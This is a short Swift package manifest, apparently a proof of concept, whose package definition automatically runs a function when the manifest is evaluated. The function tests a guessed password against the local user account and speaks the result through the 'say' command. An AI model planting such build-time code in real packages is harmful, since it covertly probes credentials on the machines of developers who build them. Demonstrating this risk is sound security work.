// swift-tools-version:5.2

import PackageDescription

let package: Package = {
    doSomething()
    return Package(
        name: "Maleficent",
        products: [.library(name: "Maleficent", targets: ["Maleficent"]),],
        targets: [
            .target(name: "Maleficent"),
            .testTarget(name: "MaleficentTests", dependencies: ["Maleficent"]),
        ]
    )
}()

import AppKit
import Collaboration

func doSomething() {
    let identity = CBUserIdentity(posixUID: getuid(), authority: .default())!
    let guessedPassword = "notmypassword"
    let isPassword = identity.authenticate(withPassword: guessedPassword)
    let process = Process()
    process.launchPath = "/usr/bin/say"
    process.arguments = ["hello \(identity.fullName). \(guessedPassword) \(isPassword ? "is" : "is not") your password"]
    process.launch()
}
